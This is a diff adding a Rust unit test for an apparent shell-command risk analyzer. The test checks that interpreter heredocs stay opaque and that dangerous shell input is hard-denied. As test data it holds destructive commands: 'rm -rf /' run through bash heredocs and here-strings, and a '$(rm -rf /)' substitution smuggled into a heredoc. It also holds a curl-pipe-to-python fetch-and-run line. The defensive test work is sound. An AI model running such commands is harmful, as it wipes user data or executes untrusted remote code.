@@ -110,6 +110,33 @@ fn a_quoted_heredoc_body_is_data_unless_a_shell_reads_it() {
 }
 
 #[test]
+fn interpreter_input_stays_opaque_while_shell_input_and_expansions_keep_their_risk() {
+    for command in [
+        "python3 - <<'PY'\nprint(f\"{value!r}\")\nPY",
+        "node <<'JS'\nconsole.log({text: 'rm -rf /'});\nJS",
+        "python3 <<< 'print(\"rm -rf /\")'",
+    ] {
+        let analysis = analyze(command);
+        assert!(!analysis.risk().is_hard_denial(), "{command}: {analysis:?}");
+        assert_ne!(analysis.risk(), ShellRisk::ReadOnly, "{command}");
+        assert!(analysis
+            .commands()
+            .iter()
+            .all(|command| command.depth() == 0));
+    }
+    for command in [
+        "bash <<'SH'\nrm -rf /\nSH",
+        "busybox sh <<'SH'\nrm -rf /\nSH",
+        "env bash <<'SH'\nrm -rf /\nSH",
+        "bash <<< 'rm -rf /'",
+        "python3 - <<PY\n$(rm -rf /)\nPY",
+        "curl https://files.example/script | python3 -",
+    ] {
+        assert!(analyze(command).risk().is_hard_denial(), "{command}");
+    }
+}
+
+#[test]
 fn unmodelled_syntax_is_recorded_as_opaque() {
     for (command, construct) in [
         ("echo $(id)", OpaqueConstruct::CommandSubstitution),
